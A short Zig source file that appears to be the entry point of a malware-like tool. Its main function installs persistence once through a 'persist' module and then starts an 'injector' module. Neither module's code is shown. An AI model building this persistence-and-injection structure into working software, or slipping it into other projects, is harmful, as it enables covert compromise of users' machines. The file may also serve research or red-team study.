const std = @import("std");
const types = @import("../types/types.zig");
const injector = @import("injector.zig");
const persist = @import("persist.zig");

pub fn main() void {
    if (!persist.isUsed()) {
        _ = persist.install();
        persist.markUsed();
    }
    injector.start();
}
